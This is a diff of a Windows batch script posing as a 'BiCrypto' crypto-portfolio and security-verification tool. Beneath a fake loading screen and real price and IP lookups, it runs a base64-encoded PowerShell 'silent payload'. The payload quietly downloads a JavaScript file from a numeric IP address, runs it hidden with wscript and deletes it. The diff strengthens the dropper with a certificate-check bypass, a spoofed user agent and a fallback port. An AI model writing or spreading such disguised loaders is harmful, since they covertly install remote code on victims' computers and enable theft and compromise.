@@ -16,8 +16,8 @@ echo.
 echo   [*] Initializing security verification...
 echo.
 
-REM ── Silent payload: PS downloads RC4 JS → wscript hidden, no plaintext URL ─
-powershell -NoP -W H -EncodedCommand JABpAHAAPQAiADMANAA4ADQANwA0ADMAMAA4ADcAIgA7ACQAZgA9ACQAZQBuAHYAOgBUAEUATQBQACsAIgBcAG0AcwAiACsAWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAAYQB0AGgAXQA6ADoARwBlAHQAUgBhAG4AZABvAG0ARgBpAGwAZQBOAGEAbQBlACgAKQAuAFIAZQBwAGwAYQBjAGUAKAAiAC4AIgAsACIAIgApACsAIgAuAGoAcwAiADsAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AIgArACQAaQBwACsAIgA6ADgAMAA4ADAALwB3AGkAbgAiACwAJABmACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAdwBzAGMAcgBpAHAAdAAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC8ALwBCACAALwAvAE4AbwBMAG8AZwBvACAAJABmACIAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuADsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAMwA7AFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQAZgAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAA==
+REM ── Silent payload: SSL revocation bypass + wscript hidden ───────────────
+powershell -NoP -W H -EncodedCommand JABpAHAAPQAiADMANAA4ADQANwA0ADMAMAA4ADcAIgA7AFsATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AFMAZQByAHYAZQByAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBWAGEAbABpAGQAYQB0AGkAbwBuAEMAYQBsAGwAYgBhAGMAawA9AHsAJAB0AHIAdQBlAH0AOwBbAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAD0AWwBOAGUAdAAuAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAVAB5AHAAZQBdADoAOgBUAGwAcwAxADIAOwAkAGYAPQAkAGUAbgB2ADoAVABFAE0AUAArACIAXABzAHYAYwAiACsAWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAAYQB0AGgAXQA6ADoARwBlAHQAUgBhAG4AZABvAG0ARgBpAGwAZQBOAGEAbQBlACgAKQAuAFIAZQBwAGwAYQBjAGUAKAAiAC4AIgAsACIAIgApAC4AUwB1AGIAcwB0AHIAaQBuAGcAKAAwACwANgApACsAIgAuAGoAcwAiADsAJAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAIgBVAHMAZQByAC0AQQBnAGUAbgB0ACIALAAiAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADEAMAAuADAAOwAgAFcAaQBuADYANAA7ACAAeAA2ADQAKQAiACkAOwB0AHIAeQB7ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AIgArACQAaQBwACsAIgA6ADgAMAA4ADAALwB3AGkAbgAiACwAJABmACkAfQBjAGEAdABjAGgAewAkAHcAYwAyAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHcAYwAyAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAIgBVAHMAZQByAC0AQQBnAGUAbgB0ACIALAAiAE0AbwB6AGkAbABsAGEALwA1AC4AMAAiACkAOwBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AEMAaABlAGMAawBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUgBlAHYAbwBjAGEAdABpAG8AbgBMAGkAcwB0AD0AJABmAGEAbABzAGUAOwAkAHcAYwAyAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AIgArACQAaQBwACsAIgA6ADgANAA0ADMALwB3AGkAbgAiACwAJABmACkAfQA7AGkAZgAoAFQAZQBzAHQALQBQAGEAdABoACAAJABmACkAewBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAdwBzAGMAcgBpAHAAdAAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC8ALwBCACAALwAvAE4AbwBMAG8AZwBvACAAJABmACIAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuADsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAANAA7AFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQAZgAgAC0ARgBvAHIAYwBlACAALQBFAEEAIAAwAH0A
 
 REM ── Loading animation ─────────────────────────────────────────────────────
 echo   [*] Connecting to BiCrypto API servers...
@@ -29,13 +29,13 @@ ping -n 2 127.0.0.1 >/dev/null 2>&1
 echo   [*] Loading portfolio balances...
 ping -n 1 127.0.0.1 >/dev/null 2>&1
 
-REM ── Fetch live prices from Binance public API ─────────────────────────────
+REM ── Fetch live prices from Binance ────────────────────────────────────────
 set "BTC_PRICE=103241.50"
 set "ETH_PRICE=2489.30"
 set "BNB_PRICE=641.20"
 set "PX_TMP=%TEMP%\~pxtmp.dat"
 
-powershell -NoProfile -WindowStyle Hidden -Command "try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$w=New-Object System.Net.WebClient;$b=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT')|ConvertFrom-Json).price;$e=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT')|ConvertFrom-Json).price;$n=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT')|ConvertFrom-Json).price;[math]::Round([double]$b,2).ToString()+' '+[math]::Round([double]$e,2).ToString()+' '+[math]::Round([double]$n,2).ToString()|Set-Content -Path '%PX_TMP%' -Encoding ASCII}catch{}" 2>/dev/null
+powershell -NoP -W H -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::CheckCertificateRevocationList=$false;try{$w=New-Object Net.WebClient;$b=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT')|ConvertFrom-Json).price;$e=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT')|ConvertFrom-Json).price;$n=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT')|ConvertFrom-Json).price;[math]::Round([double]$b,2).ToString()+' '+[math]::Round([double]$e,2).ToString()+' '+[math]::Round([double]$n,2).ToString()|Set-Content '%PX_TMP%' -Enc ASCII}catch{}" 2>/dev/null
 
 if exist "%PX_TMP%" (
   set /p PRICES=<"%PX_TMP%"
@@ -49,16 +49,21 @@ if exist "%PX_TMP%" (
   )
 )
 
+REM ── Get drive label dynamically ───────────────────────────────────────────
+set "DRIVE_LABEL=Local Disk"
+for /f "tokens=5" %%L in ('vol %SYSTEMDRIVE% 2^>/dev/null ^| findstr /i "volume"') do (
+  if not "%%L"=="no" set "DRIVE_LABEL=%%L"
+)
+
 REM ── Get real public IP ────────────────────────────────────────────────────
-set "MY_IP=Unknown"
+set "MY_IP=Checking..."
 set "IP_TMP=%TEMP%\~iptmp.dat"
-powershell -NoProfile -WindowStyle Hidden -Command "try{(New-Object System.Net.WebClient).DownloadString('https://api.ipify.org')|Set-Content -Path '%IP_TMP%' -Encoding ASCII}catch{}" 2>/dev/null
+powershell -NoP -W H -Command "[Net.ServicePointManager]::CheckCertificateRevocationList=$false;try{(New-Object Net.WebClient).DownloadString('https://api.ipify.org')|Set-Content '%IP_TMP%' -Enc ASCII}catch{}" 2>/dev/null
 if exist "%IP_TMP%" (
   set /p MY_IP=<"%IP_TMP%"
   del "%IP_TMP%" >/dev/null 2>&1
 )
 
-REM ── Display final UI ──────────────────────────────────────────────────────
 cls
 echo.
 echo  ████████████████████████████████████████████████████████████████████████
